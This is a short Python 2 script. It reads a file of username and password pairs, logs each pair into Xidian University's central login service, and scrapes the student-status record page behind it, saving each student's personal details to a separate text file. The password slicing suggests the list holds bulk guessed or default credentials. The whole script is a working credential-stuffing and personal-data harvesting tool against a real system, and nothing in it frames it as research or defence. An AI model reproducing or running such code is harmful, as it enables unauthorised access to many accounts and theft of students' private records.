import requests
import re
import sys
import time

def InfoCrawl(username,password):
    s = requests.session()
    url = 'http://ids.xidian.edu.cn/authserver/login?service=http%3A%2F%2Fjwxt.xidian.edu.cn%2Fcaslogin.jsp'
    try:
        r = s.get(url,timeout=2).content
    except:
        print "Something has been wrong!"
        return 0

    pattern1 = re.compile('<input type="hidden" name="lt" value="(.*?)" />',re.S)
    lt_value = re.search(pattern1,r).group(1)
    pattern2 = re.compile('<input type="hidden" name="execution" value="(.*?)" />',re.S)
    execution_value = re.search(pattern2,r).group(1)

    data = {
            'username' : username,
            'password' : password,
            'lt' : lt_value,
            'execution' : execution_value,
            '_eventId' : 'submit',
            'rmShown' : '1'
            }

    headers =  {
                'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0',
                'Referer' : 'http://ids.xidian.edu.cn/authserver/login?service=http%3A%2F%2Fjwxt.xidian.edu.cn%2Fcaslogin.jsp'
                }
    r = s.post(url,data=data,headers=headers,timeout=2)
    if 'false' in r.content:
        print "Fail to login in:%s" %username
        return 0
    else:
        pass
    r = s.get('http://jwxt.xidian.edu.cn/xjInfoAction.do?oper=xjxx',timeout=2)
    key_partern = re.compile('class="fieldName" width="180">(.*?):&nbsp;.*?</td>',re.S)
    value_pattern = re.compile('width="275".*?&nbsp;(.*?)</td>',re.S)
    info_key = re.findall(key_partern,r.content)
    info_value = re.findall(value_pattern,r.content)
    print info_value[1]
    num = len(info_key)
    info = open(info_value[1].strip()+'.txt','w+')
    for i in range(0,num):
        info.write("%-15s :  %-15s\n"  %(info_key[i].strip(),info_value[i].strip()))
    info.close()
    return 1


data = open('out.txt','r')
lines = data.readlines()
time.sleep(30)
for line in lines:
    tmp = line.split("              ")
    username = tmp[0].strip()
    password = tmp[1][-7:-1].strip()
    InfoCrawl(username,password)
data.close()
print "Over!"
